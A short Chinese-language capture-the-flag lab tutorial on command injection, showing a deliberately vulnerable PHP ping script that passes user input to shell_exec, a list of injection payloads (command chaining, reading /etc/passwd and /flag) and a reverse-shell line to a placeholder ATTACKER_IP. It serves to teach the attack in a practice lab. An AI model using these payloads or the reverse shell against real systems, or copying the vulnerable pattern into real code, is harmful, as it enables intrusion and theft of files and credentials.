# 命令注入

## 概述

命令注入是最常见的 RCE 漏洞类型。当应用程序将用户输入拼接到系统命令中时，攻击者可以注入额外的命令。

## 典型场景

### Ping 功能

```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

正常请求：`?ip=127.0.0.1`

恶意请求：`?ip=127.0.0.1; cat /etc/passwd`

## 攻击 Payload

### 基本注入

```
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 || id
127.0.0.1 `id`
127.0.0.1 $(id)
```

### 读取文件

```
127.0.0.1; cat /flag
127.0.0.1 | cat /flag
127.0.0.1 && cat /flag
```

### 反弹 Shell

```
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

## 练习步骤

1. 访问 ping 功能页面
2. 输入正常 IP，观察输出
3. 尝试 `127.0.0.1; id` — 确认命令注入
4. 尝试 `127.0.0.1; cat /flag` — 获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
